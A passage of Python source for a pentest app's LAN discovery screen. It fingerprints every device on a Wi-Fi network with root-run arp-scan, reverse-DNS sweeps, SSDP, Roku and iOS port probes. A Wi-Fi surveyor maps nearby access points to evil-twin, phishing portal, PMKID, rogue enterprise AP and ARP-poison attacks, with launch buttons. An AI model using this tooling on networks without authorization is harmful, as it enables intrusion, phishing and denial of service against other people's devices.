"""Discover every device on the same LAN, with vendor + hostname + kind.

The single biggest gap in a phone-based pentest setup is "what is on this
Wi-Fi with me right now". arp-scan alone gets you IP + MAC in ~2 seconds;
this screen combines that with nbtscan (NetBIOS names, which Windows and
Android often expose), avahi (mDNS/Bonjour, which routers, printers and
Apple devices publish) and reverse DNS, all run in parallel, so a whole
/24 is fully labelled in ~5-8 seconds. Rows link into RouterSploit and
nmap without retyping the IP.

Design choices worth calling out:

  * arp-scan is the fast path -- it broadcasts ARP requests, so it only
    depends on layer 2 replies and does NOT need the host to respond to
    ping (many modern devices firewall ICMP by default). MAC vendor lookup
    uses the bundled /usr/share/arp-scan/ieee-oui.txt. The mac-vendor.txt
    warning arp-scan prints is harmless (that file is for locally-defined
    overrides) and gets suppressed with `--macfile /dev/null`.

  * The hostname sources are tried in a specific order, best-first: avahi
    (real friendly names from mDNS-aware devices), then nbtscan (Windows
    machines and Android with SMB on), then getent hosts (DNS PTR record
    from the local resolver, which usually only labels the gateway).

  * Kind is inferred with a small heuristic over the vendor string and
    hostname. "locally administered" MACs -- the OUI bit-1-is-set kind --
    are the tell for modern devices with MAC randomisation on, so those
    default to Phone. Everything else routes through a few vendor
    substrings ("cisco", "netgear", "tp-link", "huawei router" clues
    etc.). It is a heuristic, not a database; the badge is a hint, the
    actual detail is the vendor string right next to it.

  * The scan runs entirely in-shell via one composed pipeline so it can
    stream to the OutputView row-by-row -- no post-processing pass at the
    end, no waiting for the whole scan to finish before the user sees
    something. The pipeline runs as root through the DBus helper
    (arp-scan and nbtscan both need raw sockets), so no per-scan polkit
    prompt.
"""
from __future__ import annotations

import os
import re

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async, which
from ..module import NHModule, register
from ..widgets import OutputView, services_banner, toast

# Guesses at the wireless-facing interface. NetworkManager gives the exact
# one but we also probe for common names in case NM is not managing wlan.
DEFAULT_IFACE_CANDIDATES = ("wlan0", "wlan1", "eth0")

# Bundled OUI database that arp-scan ships with. Owning the path here (and
# passing it explicitly) avoids arp-scan's fallback that searches ~/.arp-scan
# first, which prints a Permission-denied warning to stderr.
OUI_FILE = "/usr/share/arp-scan/ieee-oui.txt"


class Device:
    __slots__ = ("ip", "mac", "vendor", "hostname", "kind",
                 "is_gateway", "is_self")

    def __init__(self, ip: str, mac: str, vendor: str, hostname: str,
                 is_gateway: bool = False, is_self: bool = False):
        self.ip = ip
        self.mac = mac
        self.vendor = vendor
        self.hostname = hostname
        self.is_gateway = is_gateway
        self.is_self = is_self
        self.kind = _infer_kind(mac, vendor, hostname, is_gateway)

    def sort_key(self) -> tuple:
        try:
            octets = tuple(int(x) for x in self.ip.split("."))
        except ValueError:
            octets = (999,)
        # Gateway first, then everything else in IP order.
        return (0 if self.is_gateway else 1, octets)


# Small heuristic. Vendor strings from the OUI file are noisy ("Hui Zhou
# Gaoshengda Technology Co.,LTD"), so this leans on substrings and does not
# try to be authoritative -- the row shows the vendor string too, which is
# the ground truth.
_KIND_VENDOR_HINTS = (
    # Routers / networking gear
    (("cisco", "netgear", "tp-link", "tplink", "ubiquiti", "asus",
      "d-link", "dlink", "linksys", "mikrotik", "zyxel", "huawei",
      "belkin", "fritz"), "Router"),
    # Common phone / laptop OUIs
    (("apple", "samsung", "xiaomi", "motorola", "oneplus",
      "huawei device", "google inc", "lg elect", "sony mobile"), "Phone"),
    # PCs / laptops
    (("intel corporate", "dell", "hewlett", "lenovo", "asustek",
      "microsoft"), "PC"),
    # Cameras / IoT
    (("hikvision", "dahua", "axis", "reolink", "wyze", "ring",
      "amazon technologies", "espressif", "raspberry"), "IoT"),
)


def _infer_kind(mac: str, vendor: str, hostname: str,
                is_gateway: bool) -> str:
    if is_gateway:
        return "Gateway"
    v = (vendor or "").lower()
    h = (hostname or "").lower()
    # locally-administered MAC = second-least-significant bit of the
    # first octet is 1. Modern iOS / Android / Windows randomise these
    # for privacy, so it is a strong signal the device is a phone/laptop
    # in "private Wi-Fi address" mode.
    try:
        first_octet = int(mac.split(":")[0], 16)
        if first_octet & 0b10:
            return "Phone"  # or laptop with random MAC -- close enough
    except (ValueError, IndexError):
        pass
    for keywords, kind in _KIND_VENDOR_HINTS:
        for k in keywords:
            if k in v or k in h:
                return kind
    return "Device"


_ARP_LINE_RE = re.compile(
    r"^(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F:]{17})\s+(.*)$")


# arp-scan vendor strings come straight from the IEEE OUI file and
# include a lot of legal boilerplate ("TECHNOLOGIES CO.,LTD", "Corporate",
# "Inc.", "GmbH", ...). For the title-line summary we want just the
# recognisable brand -- "Huawei", "TP-Link", "Espressif" -- so trim the
# noise. The full string is still shown when the row is expanded.
# \b at both ends so "Co" only matches the standalone word, not the "co"
# inside "Cisco". "Systems" matched only at word boundary avoids clipping
# "SystemsInc" style compressed strings.
_VENDOR_NOISE = re.compile(
    r"[,\s]+\b(?:Co\.?|Corp\.?|Corporation|Corporate|Inc\.?|LLC|Ltd\.?|"
    r"Limited|GmbH|SA|S\.?A\.?|B\.?V\.?|N\.?V\.?|Pty|"
    r"TECHNOLOGY|TECHNOLOGIES|Technology|Technologies|"
    r"COMMUNICATIONS|Communications|SYSTEMS|Systems|"
    r"ELECTRONICS|Electronics|ENTERPRISE|Enterprise|"
    r"NETWORKING|Networking|SEMICONDUCTOR|Semiconductor)\.?\b",
    re.IGNORECASE,
)


def _clean_vendor(vendor: str) -> str:
    """Return the leading brand part of an OUI vendor string.

    "HUAWEI TECHNOLOGIES CO.,LTD" -> "HUAWEI"
    "Hui Zhou Gaoshengda Technology Co.,LTD" -> "Hui Zhou Gaoshengda"
    "Apple, Inc." -> "Apple"
    "(Unknown: locally administered)" -> "" (falls through to hostname)
    Bounded so a pathological input can't make the title unreadable.
    """
    if not vendor:
        return ""
    if vendor.startswith("(") or "Unknown" in vendor:
        return ""
    stripped = _VENDOR_NOISE.sub("", vendor).strip(" ,.-")
    # Take up to the first comma if any -- multi-clause names collapse.
    stripped = stripped.split(",")[0].strip()
    # Cap length; anything past 40 chars is definitely boilerplate.
    if len(stripped) > 40:
        stripped = stripped[:40].rstrip() + "…"
    return stripped


# The composed pipeline. Runs everything in one root-side subshell so we
# get a single StartStream instead of multiple polkit hops.
def _scan_script(iface: str, subnet_cidr: str) -> str:
    # Streams one line per device in the machine-readable form:
    #   OK<TAB>ip<TAB>mac<TAB>vendor<TAB>hostname
    # and one final line:
    #   DONE<TAB>N
    # so the caller does not need to guess when the pipeline is finished.
    # Progress markers ("scanning...", "resolving...") are prefixed with
    # `# ` so they can be hidden or dimmed in the OutputView.
    return r'''set -eu
IFACE=%s
SUBNET=%s
OUI=%s

# Avahi-daemon may not be running (it is preset-disabled on
# postmarketOS/Kali). Without it, avahi-resolve-address returns whatever
# nsswitch / DNS PTR yields, which is usually nothing on a home LAN. The
# operator is expected to start it from the Kali Services module (a
# banner at the top of Network Discovery deep-links there); we do not
# start it here so the app has a single point where systemd services
# are turned on / off. `avahi-browse -atrp` still primes the cache with
# whatever it can see if the daemon is running.
# Ask the gateway's DNS (which is usually dnsmasq on the router) for reverse
# PTRs of every LAN IP. On any home router running dnsmasq -- basically all
# consumer boxes -- the DHCP daemon auto-registers `hostname->ip` in its own
# DNS, so a PTR query straight at the gateway hands us the DHCP client
# hostname without any auth or scraping. Falls back silently if the router
# doesn't run a resolver on port 53 or refuses PTR lookups. The results are
# written to a temp file so the per-IP lookup can just grep instead of
# firing another network round trip.
GW_HOST_FILE=/tmp/net-disc-gwhost.$$
: > "$GW_HOST_FILE"
if command -v dig >/dev/null 2>&1; then
  # Get the gateway IP from the default route.
  GW=$(ip -4 -o route show default 2>/dev/null | awk '{print $3}' | head -1)
  if [ -n "$GW" ]; then
    # /24 sweep by default; adjust the range if the subnet is bigger. The
    # background parallel fire-and-forget style keeps this fast (~2 s) and
    # bounded (`wait` at the end).
    IFS='.' read -r a b c _ <<<"$(echo "$SUBNET" | cut -d/ -f1)"
    for i in $(seq 1 254); do
      (
        h=$(timeout 1 dig +short +time=1 +tries=1 -x "$a.$b.$c.$i" @"$GW" 2>/dev/null | head -1)
        # dig returns "hostname.local." or "hostname." -- strip trailing dot
        # and skip the placeholder "_gateway" so the vendor wins for the
        # actual router row.
        h=${h%%.}
        h=${h%%.local}
        case "$h" in
          ""|"_gateway"|"gateway"|"localhost") ;;
          *)  printf '%%s\t%%s\n' "$a.$b.$c.$i" "$h" >> "$GW_HOST_FILE" ;;
        esac
      ) &
    done
    wait
  fi
fi

if command -v avahi-browse >/dev/null 2>&1; then
  # -a all types, -t terminate, -r resolve, -p parsable. 4-second cap.
  # Post-process with python to decode avahi's octal escapes (\047 for
  # apostrophe, \032 for control chars, etc.) and emit a small
  # tab-separated file: ip<TAB>name<TAB>fqdn -- one line per resolved
  # host, so the per-IP lookup in the arp loop is a plain awk match
  # instead of another network round trip.
  timeout 4 avahi-browse -atrp 2>/dev/null \
    | python3 -c '
import sys, re
seen = {}
octal = re.compile(r"\\(\d{3})")
def dec(s):
    return octal.sub(lambda m: chr(int(m.group(1), 8)), s or "")
for line in sys.stdin:
    p = line.rstrip("\n").split(";")
    if len(p) < 8 or p[0] != "=":
        continue
    ip = p[7]
    if not ip or ":" in ip:
        continue
    if ip in seen:
        continue
    name = dec(p[3])
    fqdn = dec(p[6])
    if fqdn.endswith(".local"):
        fqdn = fqdn[:-6]
    if re.match(r"^[0-9a-f]{4,}-", fqdn.lower()):
        fqdn = ""
    seen[ip] = (name, fqdn)
for ip, (name, fqdn) in seen.items():
    print("%%s\t%%s\t%%s" %% (ip, name, fqdn))
' > /tmp/net-disc-avahi.$$ 2>/dev/null || true
else
  : > /tmp/net-disc-avahi.$$
fi

echo "# arp-scan on $IFACE ($SUBNET)"
arp-scan --interface="$IFACE" --localnet \
  --ouifile="$OUI" --macfile=/dev/null 2>/dev/null \
  | awk -F'\t' 'NF>=3 && $1 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/' \
  > /tmp/net-disc-arp.$$

echo "# resolving hostnames in parallel"
while IFS=$'\t' read -r IP MAC VENDOR; do
  (
    HOST=""
    # 1) Router DHCP hostname via reverse DNS on the gateway. This is the
    #    highest-yield source on any LAN where the router runs dnsmasq
    #    (nearly every consumer / SoHo box): the DHCP daemon auto-registers
    #    every client's hostname, so a PTR query at the router hands back
    #    the exact name the device announced when it joined -- including
    #    "DESKTOP-XYZ123" from Windows and "Alexs-iPhone" from iOS, both of
    #    which are otherwise invisible when the device stops advertising
    #    mDNS after joining.
    if [ -s "$GW_HOST_FILE" ]; then
      H=$(awk -F'\t' -v ip="$IP" '$1==ip {print $2; exit}' "$GW_HOST_FILE")
      if [ -n "$H" ]; then
        HOST=$H
      fi
    fi
    # 2) mDNS cache -- the python preprocessor above already decoded
    #    octal escapes and stripped .local, so this is just an awk
    #    match. `name` (field 2) is the service instance name (the
    #    friendly one); `fqdn` (field 3) is the raw hostname. Prefer
    #    name because it is typically what the device operator wanted
    #    the world to see ("Philips-FHD-Android" vs a random uuid).
    if [ -z "$HOST" ] && [ -s /tmp/net-disc-avahi.$$ ]; then
      LINE=$(awk -F'\t' -v ip="$IP" '$1==ip {print $2 "\t" $3; exit}' \
             /tmp/net-disc-avahi.$$)
      if [ -n "$LINE" ]; then
        NAME=$(echo "$LINE" | awk -F'\t' '{print $1}')
        FQDN=$(echo "$LINE" | awk -F'\t' '{print $2}')
        if [ -n "$NAME" ] && [ ${#NAME} -lt 40 ]; then
          HOST=$NAME
        elif [ -n "$FQDN" ]; then
          HOST=$FQDN
        fi
      fi
    fi
    # 3) direct mDNS resolve as a fallback (in case the browse-cache
    #    missed a device that responds to targeted PTR queries).
    if [ -z "$HOST" ] && command -v avahi-resolve-address >/dev/null 2>&1; then
      HOST=$(timeout 1 avahi-resolve-address "$IP" 2>/dev/null \
             | awk '{print $2}' | head -1)
      HOST=${HOST%%.local}
    fi
    # 4) NetBIOS (Windows / Android SMB / older devices)
    if [ -z "$HOST" ] && command -v nbtscan >/dev/null 2>&1; then
      HOST=$(timeout 1 nbtscan -q "$IP" 2>/dev/null \
             | awk '{print $2}' | head -1)
      case "$HOST" in "$IP") HOST="" ;; esac
    fi
    # 5) DNS PTR from whatever resolver the system uses (usually only
    #    labels the gateway).
    if [ -z "$HOST" ]; then
      HOST=$(timeout 1 getent hosts "$IP" 2>/dev/null \
             | awk '{print $2}' | head -1)
    fi
    # 6) Unicast SSDP M-SEARCH -- TVs, Sonos, Chromecast, Roku, printers,
    #    smart speakers and Windows PCs with UPnP on all respond to a
    #    unicast M-SEARCH sent to their own IP:1900 even when they
    #    aren't advertising. When they respond with a LOCATION URL,
    #    fetch it and pull <friendlyName> from the UPnP device
    #    description XML. This is the single highest-yield "unknown
    #    device" enricher on a modern LAN.
    if [ -z "$HOST" ]; then
      LOC=$(printf 'M-SEARCH * HTTP/1.1\r\nHOST: %%s:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n' "$IP" \
        | timeout 2 nc -u -w2 "$IP" 1900 2>/dev/null \
        | grep -i '^location:' | head -1 | tr -d '\r' \
        | awk '{print $2}')
      if [ -n "$LOC" ]; then
        FN=$(timeout 2 curl -s --max-time 2 "$LOC" 2>/dev/null \
             | grep -oE '<friendlyName>[^<]+' | head -1 \
             | sed 's/<friendlyName>//')
        if [ -n "$FN" ] && [ ${#FN} -lt 60 ]; then
          HOST=$FN
        fi
      fi
    fi
    # 7) Roku ECP -- Roku boxes expose an unauthenticated JSON endpoint
    #    on TCP/8060 with the user-set device name. Cheap: one HTTP GET
    #    to a fixed port with a 1-second timeout, so a non-Roku device
    #    just drops the connection and we move on.
    if [ -z "$HOST" ]; then
      RN=$(timeout 1 curl -s --max-time 1 \
            "http://$IP:8060/query/device-info" 2>/dev/null \
            | grep -oE '<user-device-name>[^<]+' | head -1 \
            | sed 's/<user-device-name>//')
      if [ -n "$RN" ] && [ ${#RN} -lt 60 ]; then
        HOST=$RN
      fi
    fi
    # 8) Apple lockdownd -- open TCP/62078 is a nearly-definitive iOS
    #    identifier (iPhone/iPad). Doesn't give us a name, but tag the
    #    device as an Apple mobile so the kind hint isn't just "Phone".
    if [ -z "$HOST" ]; then
      if timeout 1 bash -c "exec 3<>/dev/tcp/$IP/62078" 2>/dev/null; then
        HOST="Apple mobile device"
        exec 3<&- 3>&- 2>/dev/null || true
      fi
    fi
    printf "OK\t%%s\t%%s\t%%s\t%%s\n" "$IP" "$MAC" "$VENDOR" "${HOST:-}"
  ) &
done < /tmp/net-disc-arp.$$
wait
N=$(wc -l < /tmp/net-disc-arp.$$ | tr -d ' ')
rm -f /tmp/net-disc-arp.$$ /tmp/net-disc-avahi.$$ "$GW_HOST_FILE"
echo "DONE	$N"
''' % (
        GLib.shell_quote(iface),
        GLib.shell_quote(subnet_cidr),
        GLib.shell_quote(OUI_FILE),
    )


@register
class NetDiscovery(NHModule):
    title = "Network Discovery"
    icon = "network-workgroup-symbolic"
    description = "Who else is on this Wi-Fi (LAN scan with vendor + hostname)"
    required_tools = ["arp-scan"]

    def __init__(self, app_window):
        super().__init__(app_window)
        self._proc: Process | None = None
        self._devices: dict[str, Device] = {}
        self._gateway = ""
        self._self_ip = ""
        self._iface = ""
        self._device_rows: list[Adw.ExpanderRow] = []
        # Active ARP-poison "block internet" attacks, keyed by victim IP.
        # An entry is present iff a Process is currently running for that
        # victim. Used to gate the row button between Start / Stop and to
        # be able to stop them all when the module is torn down.
        # See _toggle_block() for the state machine.
        self._block_procs: dict[str, Process] = {}
        # Row buttons that need their label swapped when the attack state
        # changes -- one per active victim. Keyed by IP.
        self._block_buttons: dict[str, Gtk.Button] = {}

    # -------------------------------------------------------------- build
    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        # Services banner: mDNS discovery needs avahi-daemon;
        # NetworkManager is optional but improves the LAN summary.
        box.append(services_banner(
            self.app_window,
            ["avahi-daemon", "NetworkManager"]))

        # ---- band capabilities ------------------------------------
        # Sanity-check for the operator: what bands can the current
        # adapter actually reach? If wlan0 does not support 6 GHz,
        # attacks that assume Wi-Fi 6E (SSID Confusion, some Fragattacks
        # variants, MLO desync tests) will just fail. Show up front.
        bands_group = Adw.PreferencesGroup(
            title="Adapter capabilities",
            description="From `iw phy` on the primary and, if present, "
                        "the monitor phys. If 5/6 GHz are missing "
                        "here, attacks that need them will not work.")
        self.bands_row = Adw.ActionRow(
            title="Bands",
            subtitle="checking…")
        bands_group.add(self.bands_row)
        box.append(bands_group)
        # Kick the check async so the UI paints instantly.
        run_async(
            ["sh", "-c",
             "for p in $(ls /sys/class/ieee80211/ 2>/dev/null); do "
             "  echo \"$p:\"; iw phy $p info 2>/dev/null | "
             "  grep -E '^\\s*\\* [0-9]{4} MHz' | "
             "  awk '{print $2}' | sort -u | head -30; "
             "done"],
            self._on_bands, root=False, timeout=10)

        # ---- network summary --------------------------------------
        self.summary_group = Adw.PreferencesGroup(title="This network")
        self.summary_row = Adw.ActionRow(
            title="Detecting…",
            subtitle="Ask NetworkManager for the current SSID and subnet")
        self.summary_group.add(self.summary_row)
        box.append(self.summary_group)

        # ---- controls ---------------------------------------------
        controls = Adw.PreferencesGroup()

        # Interface entry, prefilled from the default route.
        self.iface_entry = Adw.EntryRow(title="Interface")
        self.iface_entry.set_text("")
        controls.add(self.iface_entry)

        self.subnet_entry = Adw.EntryRow(title="Subnet (CIDR)")
        self.subnet_entry.set_text("")
        controls.add(self.subnet_entry)

        row = Adw.ActionRow(
            title="Scan network",
            subtitle="arp-scan + nbtscan + avahi + DNS in parallel "
                     "(~5-8 seconds for a /24)")
        self.scan_btn = Gtk.Button(label="Scan", valign=Gtk.Align.CENTER)
        self.scan_btn.add_css_class("suggested-action")
        self.scan_btn.connect("clicked", lambda _b: self._start_scan())
        row.add_suffix(self.scan_btn)
        self.stop_btn = Gtk.Button(label="Stop", valign=Gtk.Align.CENTER)
        self.stop_btn.add_css_class("destructive-action")
        self.stop_btn.set_sensitive(False)
        self.stop_btn.connect("clicked", lambda _b: self._stop())
        row.add_suffix(self.stop_btn)
        controls.add(row)

        box.append(controls)

        # ---- results ----------------------------------------------
        self.results_group = Adw.PreferencesGroup(
            title="Devices",
            description="Rows expand to show the vendor string and per-device "
                        "actions -- copy the IP, send it to nmap, or feed it "
                        "into RouterSploit's target field.")
        self._empty_row = Adw.ActionRow(
            title="No scan yet", subtitle="Press Scan to start")
        self.results_group.add(self._empty_row)
        box.append(self.results_group)

        # ---- Wi-Fi AP surveyor ------------------------------------
        # Scans the air with a monitor interface and, for every visible
        # AP, tells the user which attacks are viable given the
        # security posture. Deep-links straight to the attack module
        # so the operator does not need to remember which target
        # goes where.
        surv_group = Adw.PreferencesGroup(
            title="Wi-Fi AP surveyor",
            description="Passive scan of nearby APs; per-AP verdicts + "
                        "one-click hop to the right attack module.")
        self.surv_iface = Adw.EntryRow(title="Monitor interface")
        self.surv_iface.set_text("wlan1mon")
        surv_group.add(self.surv_iface)

        surv_action = Adw.ActionRow(
            title="Sweep air",
            subtitle="airodump-ng; press Stop when you have enough")
        self.surv_btn = Gtk.Button(label="Start",
                                   valign=Gtk.Align.CENTER)
        self.surv_btn.add_css_class("suggested-action")
        self.surv_btn.connect(
            "clicked", lambda _b: self._start_survey())
        surv_action.add_suffix(self.surv_btn)
        self.surv_stop_btn = Gtk.Button(label="Stop",
                                        valign=Gtk.Align.CENTER)
        self.surv_stop_btn.set_sensitive(False)
        self.surv_stop_btn.connect(
            "clicked", lambda _b: self._stop_survey())
        surv_action.add_suffix(self.surv_stop_btn)
        surv_group.add(surv_action)
        box.append(surv_group)

        self.surv_results = Adw.PreferencesGroup(
            title="APs in range",
            description="ESSID · BSSID · security · attack hints")
        self._surv_empty = Adw.ActionRow(
            title="No survey yet",
            subtitle="Press Sweep with a monitor iface up")
        self.surv_results.add(self._surv_empty)
        self._surv_rows: list[Adw.ExpanderRow] = []
        box.append(self.surv_results)

        # ---- streaming log ----------------------------------------
        self.output = OutputView()
        box.append(self.output)

        self._detect_network()
        return box

    # ---------------------------------------------------- surveyor
    def _start_survey(self) -> None:
        """Kick airodump-ng as an owned subprocess. Every 3 s we
        re-read the CSV and repaint the AP list, so the operator
        sees results accumulate live. Stop terminates the
        subprocess and one final re-read renders the full CSV."""
        if getattr(self, "_surv_proc", None) is not None:
            return
        iface = self.surv_iface.get_text().strip() or "wlan1mon"

        # Wipe old CSVs so the awk in the timer never reads stale rows.
        run_async(
            ["sh", "-c", "rm -f /tmp/nhp-surv-*"],
            lambda _r: None, root=True, timeout=5)

        self.output.append("# surveying APs on " + iface + "…\n")
        self.surv_btn.set_sensitive(False)
        self.surv_stop_btn.set_sensitive(True)

        argv = ["airodump-ng", "--output-format", "csv",
                "-w", "/tmp/nhp-surv", iface]

        def on_done(_code: int) -> None:
            self._surv_proc = None
            self.surv_btn.set_sensitive(True)
            self.surv_stop_btn.set_sensitive(False)
            # One last CSV read after airodump exits.
            run_async(
                ["sh", "-c",
                 "cat /tmp/nhp-surv-01.csv 2>/dev/null || echo"],
                lambda r: self._render_survey(r.stdout or ""),
                root=True, timeout=5)

        self._surv_proc = Process(
            argv, lambda _t: None, on_done, root=True)
        self._surv_proc.start()
        # Live-refresh loop: read the CSV every 3 s.
        GLib.timeout_add_seconds(3, self._tick_survey)

    def _stop_survey(self) -> None:
        proc = getattr(self, "_surv_proc", None)
        if proc is not None:
            proc.stop()

    def _tick_survey(self) -> bool:
        if getattr(self, "_surv_proc", None) is None:
            return False
        run_async(
            ["sh", "-c",
             "cat /tmp/nhp-surv-01.csv 2>/dev/null || echo"],
            lambda r: self._render_survey(r.stdout or ""),
            root=True, timeout=5)
        return True

    def _render_survey(self, csv_text: str) -> None:
        aps = self._parse_survey(csv_text)
        for r in self._surv_rows:
            self.surv_results.remove(r)
        self._surv_rows = []
        self._surv_empty.set_visible(not aps)
        if not aps:
            return
        # Sort by signal (RSSI, higher = closer)
        try:
            aps.sort(key=lambda a: int(a["power"] or "-999"),
                     reverse=True)
        except ValueError:
            pass
        for ap in aps[:30]:
            self._surv_rows.append(self._make_surv_row(ap))

    def _parse_survey(self, csv_text: str) -> list[dict]:
        aps: list[dict] = []
        for row in csv_text.splitlines():
            row = row.strip()
            if not row or row.startswith(("BSSID", "Station")):
                continue
            parts = [p.strip() for p in row.split(",")]
            if len(parts) < 14 or ":" not in parts[0]:
                continue
            try:
                aps.append({
                    "bssid": parts[0],
                    "channel": parts[3],
                    "privacy": parts[5],
                    "cipher": parts[6],
                    "auth": parts[7],
                    "power": parts[8],
                    "beacons": parts[9],
                    "essid": parts[13],
                })
            except IndexError:
                continue
        return aps

    def _classify_ap(self, ap: dict) -> tuple[list[str], list[str]]:
        """Return (attack_hints, vuln_hints) for the given AP row."""
        priv = (ap["privacy"] or "").upper()
        auth = (ap["auth"] or "").upper()
        attacks = []
        vulns = []
        # OPEN -> obvious captive-portal / evil-twin target.
        if "OPN" in priv or priv == "":
            attacks.append("EvilTwin/open + captive portal (phishkin3)")
            vulns.append("no encryption")
        elif "WEP" in priv:
            attacks.append("aircrack WEP (chopchop / fragmentation)")
            vulns.append("WEP crackable in <10 min")
        elif "WPA3" in priv and "WPA2" not in priv:
            attacks.append("WPA3-SAE downgrade twin (Dragonblood)")
            vulns.append("WPA3 pure, PMKID/deauth immune")
        elif "WPA2" in priv or "WPA" in priv:
            attacks.append("PMKID capture (hcxdumptool)")
            attacks.append("Handshake capture + wpa-sec")
            if "MGT" in auth or "EAP" in auth:
                attacks.append(
                    "EAPHammer rogue Enterprise AP")
                vulns.append("Enterprise: watch for weak cert pin")
            else:
                attacks.append("EvilTwin WPA2 (if PSK known)")
        # PMKID leak likelihood by vendor OUI. hcxdumptool works
        # against almost every WPA2/WPA3-Transition AP; we do not
        # try to be smarter here.

        # WPS? airodump does not put WPS in CSV; use the wash-driven
        # WPS module for the enum. We flag "check WPS" as a hint.
        attacks.append("wash → wifi_attacks (check WPS)")
        # If both WPA2 and WPA3 are advertised -> transition mode ->
        # downgrade attack path.
        if "WPA3" in priv and "WPA2" in priv:
            attacks.insert(0, "WPA3→WPA2 downgrade twin")
            vulns.append("WPA3-Transition (downgradeable)")
        return attacks, vulns

    def _make_surv_row(self, ap: dict) -> Adw.ExpanderRow:
        title = ap["essid"] or "<hidden>"
        subtitle = "%s · ch %s · %s dBm · %s %s" % (
            ap["bssid"], ap["channel"] or "?",
            ap["power"] or "?",
            ap["privacy"] or "?",
            ap["cipher"] or "")
        row = Adw.ExpanderRow(title=title, subtitle=subtitle)
        attacks, vulns = self._classify_ap(ap)

        for v in vulns:
            r = Adw.ActionRow(title="Weakness",
                              subtitle=v)
            row.add_row(r)

        for a in attacks:
            r = Adw.ActionRow(title="Attack", subtitle=a)
            # Add a launcher button that deep-links to the module
            # based on the hint text.
            btn = Gtk.Button(label="Launch",
                             valign=Gtk.Align.CENTER)
            btn.connect(
                "clicked",
                lambda _b, ap=ap, hint=a:
                    self._launch_attack(hint, ap))
            r.add_suffix(btn)
            row.add_row(r)
        self.surv_results.add(row)
        return row

    def _on_bands(self, r: Result) -> None:
        """Parse the frequencies each phy exposes and classify by
        band. 2.4 GHz = 2400-2500, 5 GHz = 5100-5900, 6 GHz = 5925-7125.
        """
        out = r.stdout or ""
        phys: dict[str, set[str]] = {}
        current = None
        for line in out.splitlines():
            line = line.strip()
            if line.endswith(":") and line.startswith("phy"):
                current = line[:-1]
                phys[current] = set()
                continue
            if current is None or not line.isdigit():
                continue
            f = int(line)
            if 2400 <= f <= 2500:
                phys[current].add("2.4 GHz")
            elif 5100 <= f <= 5900:
                phys[current].add("5 GHz")
            elif 5925 <= f <= 7125:
                phys[current].add("6 GHz (Wi-Fi 6E)")
        if not phys:
            self.bands_row.set_subtitle("no wireless phys detected")
            return
        parts = []
        for p, bands in phys.items():
            parts.append(p + ": " + (
                ", ".join(sorted(bands)) or "(none)"))
        self.bands_row.set_subtitle(" · ".join(parts))

    def _launch_attack(self, hint: str, ap: dict) -> None:
        """Route a hint text to the right module via deep-link."""
        target = "|".join((ap["essid"] or "",
                            ap["bssid"] or "",
                            ap["channel"] or ""))
        h = hint.lower()
        if "pmkid" in h:
            self.app_window.activate_module("pmkid", ap["bssid"])
        elif "handshake" in h:
            self.app_window.activate_module(
                "handshake",
                "%s|%s|%s" % (ap["bssid"],
                              ap["channel"], ap["essid"]))
        elif "eaphammer" in h or "enterprise" in h:
            self.app_window.activate_module(
                "eaphammer", target)
        elif "wps" in h:
            self.app_window.activate_module(
                "wifi_attacks", ap["bssid"])
        elif "captive" in h:
            self.app_window.activate_module(
                "phishkin3", target)
        elif "downgrade" in h or "wpa3" in h or "twin" in h \
                or "eviltwin" in h:
            self.app_window.activate_module(
                "evil_twin", target)
        elif "wep" in h:
            self.app_window.activate_module(
                "wifite", ap["bssid"])
        else:
            toast(self.app_window, "No module for: " + hint)

    # ------------------------------------------------------- detect
    def _detect_network(self) -> None:
        # Two probes:
        #  - default route -> interface, gateway IP
        #  - inet on that interface -> our IP, subnet CIDR
        #  - NetworkManager active SSID for the summary line
        script = (
            r'''
            GW=$(ip -4 -o route show default 2>/dev/null | awk '{print $3}' | head -1)
            IF=$(ip -4 -o route show default 2>/dev/null | awk '{print $5}' | head -1)
            IP=$(ip -4 -o addr show "$IF" 2>/dev/null | awk '{print $4}' | head -1)
            SSID=$(nmcli -t -f active,ssid dev wifi 2>/dev/null | awk -F: '$1=="yes"{print $2; exit}')
            printf "%s|%s|%s|%s\n" "$IF" "$GW" "$IP" "${SSID:-}"
            '''
        )

        def done(r: Result) -> None:
            parts = (r.stdout or "").strip().split("|")
            if len(parts) < 4:
                self.summary_row.set_title("Not connected")
                self.summary_row.set_subtitle(
                    "No default IPv4 route. Connect to a Wi-Fi first.")
                return
            iface, gw, ipcidr, ssid = parts
            self._iface = iface or ""
            self._gateway = gw or ""
            self._self_ip = (ipcidr or "").split("/")[0]
            self.iface_entry.set_text(iface or "")
            self.subnet_entry.set_text(ipcidr or "")
            title = ssid if ssid else "Wired network"
            subtitle = "%s -- your IP %s -- gateway %s" % (
                iface or "?", ipcidr or "?", gw or "?")
            self.summary_row.set_title(title)
            self.summary_row.set_subtitle(subtitle)

        run_async(["sh", "-c", script], done, root=False, timeout=8)

    # ----------------------------------------------------------- scan
    def _start_scan(self) -> None:
        iface = self.iface_entry.get_text().strip() or self._iface
        subnet = self.subnet_entry.get_text().strip()
        if not iface:
            toast(self.app_window, "Fill in an interface first")
            return
        # arp-scan uses --localnet from the interface; the subnet field in
        # the UI is informational (and can be used to override in a future
        # revision). For now the scan just calls arp-scan with the given
        # interface and its own idea of the local subnet.

        # Clear previous results.
        for r in self._device_rows:
            self.results_group.remove(r)
        self._device_rows = []
        self._devices = {}
        # The button references belong to rows we just tore down.
        # Any active block attacks keep running (their Process is what
        # matters, not the button), and the next _add_device_row call
        # for the same victim IP will re-register a fresh button in
        # the "Stop blocking" state.
        self._block_buttons = {}
        self._empty_row.set_title("Scanning…")
        self._empty_row.set_subtitle(
            "arp-scan sweeping /24 then paralleled resolution")
        self._empty_row.set_visible(True)

        self.output.clear()
        self.output.append("# starting network discovery on %s\n" % iface)

        script = _scan_script(iface, subnet)
        # Explicit bash. The script uses `IFS=$'\t'` (ANSI-C quoting) and
        # `read -r` in a way that dash (which is what `sh` symlinks to on
        # most modern distros) treats as 5 literal characters instead of
        # a single tab. That silently split the vendor "administered)" on
        # its 4th-from-last character, producing "adminis" and "ered)"
        # instead of a single vendor field, and the app rendered "ered)"
        # as the title of any MAC-randomised device. bash sees $'\t' as
